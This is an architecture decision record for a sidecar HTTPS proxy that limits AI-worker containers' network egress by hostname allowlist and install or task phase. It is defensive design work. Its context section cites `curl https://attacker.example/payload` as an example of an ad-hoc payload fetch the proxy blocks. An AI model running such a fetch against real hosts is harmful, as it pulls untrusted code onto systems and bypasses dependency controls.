# ADR-0060 — Sidecar HTTPS proxy for worker egress scoping

- **Status:** accepted
- **Date:** 2026-05-28
- **Supersedes:** none
- **Related:** ADR-0050 (onboarding persistence), ADR-0058 (gate-broken
  verdict), ADR-0059 (per-repo worker-dep registration)

## Context

ADR-0059 introduced per-repo `worker_deps` registration so a repo's
extras (Python / Node packages, signed binaries) are named in the
onboarding config rather than baked into the agent image. Step 2 of
that ADR shipped on-worker materialization: the worker runs
`pip install`, `npm install`, and signed binary downloads at the
start of each task.

That materialization needs network egress. The base agent container
today has **no enforcement** at the egress boundary — it has full
network access. ADR-0059's Step 3 is the missing complement: with
worker_deps registration as the canonical channel for deps, the
worker's runtime must close the back door so a task can't reach
around the registration with an ad-hoc `pip install foo` /
`curl https://attacker.example/payload` / unregistered binary fetch
during validation.

The framing is **determinism over security** (operator decision
2026-05-28). The primary goal is to make worker_deps registration
the *only* path for a dep to reach the worker, so a missing dep
fails loudly at registration-time rather than silently at task-time —
the same wedge category that motivated ADR-0058 + ADR-0059 after
the 2026-05-27 RAMJAC `ModuleNotFoundError: aws_cdk` incident.
Security-mode hardening (TLS interception, audit logs, threat-model
review) is reserved as B-track follow-on work; the architecture
chosen here is compatible with that extension but doesn't require
shipping it now.

## Decision

A **sidecar HTTPS proxy** mediates all worker network egress. Worker
containers join a docker network with no direct internet gateway;
the proxy is the only reachable host outside `127.0.0.1`. The proxy
enforces an allowlist keyed by hostname and per-worker phase
(materialize vs task).

### Architecture

Per autoscaler host (dev-local Docker daemon; prod EC2 instance):

- A `treadmill-egress-proxy` container runs alongside the worker
  fleet, bound to an internal docker bridge (e.g. `treadmill-egress`).
- Each worker the autoscaler spawns joins that internal bridge with
  **no external gateway**. From inside the worker, the proxy is the
  only routable external address.
- Workers always set `HTTPS_PROXY=http://treadmill-egress-proxy:3128`
  (and `HTTP_PROXY` for plaintext) at entrypoint. There is no
  "unset proxy and direct-egress" path — the worker has no route
  to any external host except via the proxy.
- The proxy makes the allow/deny decision per-request using the
  active allowlist for the worker, which the proxy reads from a
  per-worker config the autoscaler writes when the worker starts.

The phase toggle is **proxy-side**, not worker-side. The worker
configuration is identical in both phases; the proxy distinguishes
materialize-phase requests from task-phase requests via a per-request
authentication token that only `materialize()` sets on its subprocess
env. Task-phase subprocesses don't see the token, so the proxy
applies the always-allowed allowlist only.

### Effective allowlist

| Phase | Reachable via proxy |
|---|---|
| Always-allowed (both phases) | `api.anthropic.com`, `api.github.com`, `*.githubusercontent.com`, `*.github.com`, the per-deploy Treadmill API host |
| Materialize-phase only | `pypi.org`, `files.pythonhosted.org`, `registry.npmjs.org`, `registry.yarnpkg.com`, plus the signed binary URLs from `RepoConfig.worker_deps.binaries[].download_url` for the active repo |

**Future-extension hook:** AWS CodeArtifact and other private
package registries will need per-repo allowlist entries. They land
as an additive `RepoConfig.worker_deps.allowed_egress_domains:
list[str]` field when the first CodeArtifact-using repo onboards;
the proxy reads them into the materialize-phase allowlist for that
worker. Out of scope for this ADR's first cut.

### Proxy implementation

The proxy is **HTTP-CONNECT-only** — it sees the hostname on the
`CONNECT` line and makes the allow/deny decision per-hostname. It
does *not* terminate TLS, does *not* see request bodies, does *not*
modify traffic. Body inspection is a security-mode feature reserved
for B-track.

Implementation choices (deferred to the plan, not the ADR):

- Adopt an existing proxy (tinyproxy, squid in CONNECT-only mode)
  with a small config-reload script.
- Or a thin custom service in Python (`aiohttp` or stdlib).

The autoscaler writes the per-worker allowlist config keyed by the
worker container's IP on the egress bridge (docker assigns a stable
IP per container for its lifetime). The proxy reloads the keyed map
on file change or on signal; no DB dependency.

### Runner integration

`workers/agent/treadmill_agent/repo_deps.py::materialize()` is the
*only* site that sets the install-phase token. It injects an
HTTP-Basic-style proxy-auth credential into the subprocess env it
passes to `pip` / `npm` / `urllib` calls; the proxy validates that
credential against the autoscaler-written config and, only on
match, applies the install-phase allowlist.

The validation subprocess in `validation_runtime.py` runs with the
*same* `HTTPS_PROXY` but no install-phase credential — the proxy
sees it as task-phase, applies the always-allowed allowlist only.

The "no install-phase egress during task work" property follows from
*the credential not being present in task-phase env*, not from any
worker-side toggle. The worker is treated as untrusted with respect
to its own phase claim; the credential is the only signal the proxy
honors.

## Consequences

**Positive:**

- Closes the ad-hoc dep back door behind worker_deps registration.
  A missing dep fails at registration-time with a legible error, not
  at task-time with `ConnectionRefusedError` or
  `ModuleNotFoundError`.
- Operator audit trail: the proxy logs every external call by
  hostname. Cheap audit log without MITM.
- Forward-compatible with security-mode follow-on work: TLS
  interception and request-body inspection bolt on at the proxy
  layer without touching the worker.
- Matches dev-local and prod EC2 with the same docker primitive
  (internal bridge + sidecar). No host-specific iptables fiddling.
- Per-repo signed-URL binaries work out of the box: the autoscaler
  adds them to the install-phase allowlist for the worker's lifetime.

**Negative:**

- Adds a new long-running service (`treadmill-egress-proxy`) to the
  worker-side surface. Health-monitor + restart story needed; a dead
  proxy means a dead worker fleet, so it sits in the critical path.
- The phase-toggle correctness depends on `materialize()` being the
  *only* site that holds the install-phase credential. A leak (e.g.
  passing the credential-bearing env to a child process beyond
  materialize) would weaken the boundary. Mitigation: explicit
  test that the credential is absent from `validation_runtime`'s
  subprocess env.
- The "always-allowed" set is a permanent escape hatch. A malicious
  task that reaches `api.anthropic.com` or `api.github.com` with
  crafted payloads has channels for exfiltration. Acceptable under
  the determinism framing; explicitly deferred to B-track.

**Neutral:**

- The proxy is the *single* path for external traffic; that's a
  hard architectural commitment. Workers that legitimately need a
  new external domain require an allowlist update, not a code
  change. This is the desired property (determinism), but it does
  raise the floor for operator effort on new dep types.
- Proxy logs grow without bound until rotation lands — the proxy
  will write stdout-to-journald-with-rotation on prod, stdout on
  dev-local.

## Sequence (high-level — full step list in the plan)

ADR-0059's Step 3, expanded:

1. **Proxy service.** Build the `treadmill-egress-proxy` image
   (CONNECT-only proxy + per-worker config loader); define the
   config-file schema (per-worker-IP → `{always_allowed: list,
   install_allowed: list, install_credential_hash: str}`); ship
   the smoke test (allow path, deny path, install-phase elevation).
2. **Autoscaler wiring.** Create the `treadmill-egress` docker
   network on host start; spawn the proxy on it; spawn each worker
   on that network with no external gateway; write the per-worker
   config when the worker starts (always-allowed + repo-specific
   install allowlist); minted install credential goes into the
   worker's env via the secrets channel (separate from
   `CLAUDE_CODE_OAUTH_TOKEN` per ADR-0055).
3. **Runner integration.** `materialize()` injects the install
   credential into its subprocess env; `validation_runtime` and
   the `claude` invocation do not. Test pins the absence in
   task-phase subprocess env.
4. **Integration smoke.** Dispatch a task to a repo with
   `worker_deps.python: ["packaging==24.0"]`. Confirm install
   succeeds; confirm `curl https://example.com` in a validation
   script fails with proxy-denied; confirm `claude` still reaches
   the Claude API.

## Alternatives considered

**Host-level iptables + autoscaler-managed network namespace.**
Strongest enforcement (kernel-level; workload cannot manipulate).
But the phase toggle needs PID-tagged iptables rules that are
fiddly to express, dev-local doesn't currently manage host
iptables, and the audit-log story is weaker (no per-request
visibility). Rejected on implementation cost; revisit if the proxy
proves unreliable in operation.

**Two-container task (init-container materializes, task container
locked down).** Clean phase separation, matches the K8s
init-container idiom. But it reverses ADR-0059 Step 2's
already-shipped materialize-on-worker decision, requires autoscaler
rework to spawn two containers and share a volume, and the blast
radius is larger than the value. Rejected; revisit only if we move
materialization off the worker for other reasons.

**No enforcement; trust worker_deps registration as advisory.**
The status quo before this ADR. Rejected because the determinism
framing requires worker_deps to be the *only* path for a dep to
reach the worker — an advisory channel doesn't close the wedge
category that motivated ADR-0058 + ADR-0059.

**TLS interception (MITM proxy) for body inspection.** Would let
us inspect request payloads, not just hostnames. Rejected for the
first cut: outside the determinism framing, requires every worker
to trust a Treadmill-issued CA (operator effort + key-management
surface), and the security-mode benefits are deferred to B-track
anyway. The CONNECT-only proxy chosen here is forward-compatible
with adding MITM later.
